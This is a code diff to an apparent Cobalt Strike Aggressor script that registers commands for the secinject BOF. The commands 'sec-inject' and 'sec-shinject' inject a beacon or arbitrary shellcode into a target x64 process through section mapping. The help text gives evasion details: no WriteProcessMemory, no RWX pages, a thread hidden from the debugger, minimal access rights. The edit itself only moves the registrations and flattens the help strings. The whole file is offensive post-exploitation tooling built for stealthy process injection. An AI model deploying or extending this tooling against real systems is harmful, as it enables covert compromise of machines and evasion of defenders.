@@ -77,74 +77,6 @@ sub _si_check_listener {
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-# beacon_command_register — this is what drives `help sec-inject` and
-# tab-completion of the COMMAND NAME. Short line shows in `help`;
-# long text shows in `help sec-inject`.
-# ─────────────────────────────────────────────────────────────────────────────
-
-beacon_command_register(
-    "sec-inject",
-    "Inject a beacon into an x64 process via section mapping (secinject BOF)",
-    "Usage:   sec-inject <pid> <listener>\n\n" .
-    "Arguments:\n" .
-    "  <pid>       Target process ID (positive integer). Must be an x64 process\n" .
-    "              in the same session as the current beacon.\n" .
-    "  <listener>  Cobalt Strike listener name. An x64 stageless payload is\n" .
-    "              generated automatically via payload(name, \"x64\", \"thread\").\n\n" .
-    "OPSEC:\n" .
-    "  Runs the secinject BOF via inline-execute — no fork-and-run, no child\n" .
-    "  process, no WriteProcessMemory. Target's remote view is mapped\n" .
-    "  PAGE_EXECUTE_READ (no RWX). Thread is created via NtCreateThreadEx\n" .
-    "  with THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER. Target-process rights:\n" .
-    "  0x100A (minimal), not PROCESS_ALL_ACCESS. See fork README for full\n" .
-    "  patch list: https://github.com/watson0x90/secinject\n\n" .
-    "Prereq:\n" .
-    "  secinject.x64.o must sit next to this .cna (both loaded via Script\n" .
-    "  Manager). BOF is x64-only.\n\n" .
-    "Example:\n" .
-    "  beacon> sec-inject 4812 https-listener"
-);
-
-beacon_command_register(
-    "sec-shinject",
-    "Inject arbitrary shellcode from disk into an x64 process via section mapping",
-    "Usage:   sec-shinject <pid> <path/to/bin>\n\n" .
-    "Arguments:\n" .
-    "  <pid>              Target process ID (positive integer, x64 process\n" .
-    "                     in the same session as the current beacon).\n" .
-    "  <path/to/bin>      Path to a raw shellcode .bin file on the operator's\n" .
-    "                     machine (this box, not the target). Read verbatim\n" .
-    "                     and section-mapped into the target as-is.\n\n" .
-    "OPSEC:\n" .
-    "  Same primitives as sec-inject — section mapping, RX remote view,\n" .
-    "  NtCreateThreadEx hidden from debugger, 0x100A target rights.\n\n" .
-    "Example:\n" .
-    "  beacon> sec-shinject 4812 C:\\Payloads\\custom.bin"
-);
-
-beacon_command_register(
-    "sec-help",
-    "Overview of every sec-* command + secinject BOF load state",
-    "Usage:   sec-help\n\n" .
-    "Prints the full sec-* command list, per-command synopsis, and the\n" .
-    "current secinject.x64.o load state (present / missing, size). Use this\n" .
-    "as the first stop when you're not sure what's available."
-);
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-# %beacon_command_completer — CS clients that honour this hash use it for
-# positional tab-completion. Slots are 1-indexed argument positions;
-# "pid" completes to cached PIDs from `ps`, "listener" to teamserver
-# listener names. Silently ignored by CS versions that don't implement
-# this — costs nothing to include.
-# ─────────────────────────────────────────────────────────────────────────────
-
-%beacon_command_completer["sec-inject"]   = @("pid", "listener");
-%beacon_command_completer["sec-shinject"] = @("pid", "file");
-
-
-# ─────────────────────────────────────────────────────────────────────────────
 # sec-help — overview + BOF status.
 # ─────────────────────────────────────────────────────────────────────────────
 
@@ -290,5 +222,30 @@ sub _si_startup_banner {
     }
     say("[secinject] Commands: sec-inject / sec-shinject / sec-help  (or `help sec-inject` for detail)");
 }
+
+# ─────────────────────────────────────────────────────────────────────────────
+# beacon_command_register — drives `help <cmd>` and command discovery.
+# Placed AFTER the alias definitions so a registration failure never
+# blocks the aliases from loading. Single ASCII-only strings per call
+# sidestep Sleep parser edge cases around multi-line `.` concatenation
+# combined with non-ASCII characters.
+# ─────────────────────────────────────────────────────────────────────────────
+
+beacon_command_register("sec-inject",
+    "Inject a beacon into an x64 process via section mapping (secinject BOF)",
+    "Usage: sec-inject <pid> <listener>\n\n<pid> is a positive integer targeting an x64 process in the same session as the current beacon. <listener> is a CS listener name; an x64 stageless payload is generated automatically via payload(name, \"x64\", \"thread\").\n\nOPSEC: runs via inline-execute (no fork-and-run, no child process, no WriteProcessMemory). Target's remote view is mapped PAGE_EXECUTE_READ (no RWX). Thread created via NtCreateThreadEx with THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER. Target-process rights 0x100A. Fork README: https://github.com/watson0x90/secinject");
+
+beacon_command_register("sec-shinject",
+    "Inject arbitrary shellcode from disk into an x64 process via section mapping",
+    "Usage: sec-shinject <pid> <path/to/bin>\n\n<pid> is a positive integer targeting an x64 process in the same session. <path/to/bin> is a raw shellcode .bin on the OPERATOR'S machine (not the target); it is read verbatim and section-mapped into the target as-is.\n\nSame primitives as sec-inject.");
+
+beacon_command_register("sec-help",
+    "Overview of every sec-* command + secinject BOF load state",
+    "Usage: sec-help\n\nPrints the full sec-* command list, per-command synopsis, and the current secinject.x64.o load state (path, size, or MISSING). First-stop discovery command.");
+
+# %beacon_command_completer - CS clients that honour this hash use it
+# for positional tab-completion. Silently ignored by clients that don't.
+%beacon_command_completer["sec-inject"]   = @("pid", "listener");
+%beacon_command_completer["sec-shinject"] = @("pid", "file");
 
 _si_startup_banner();
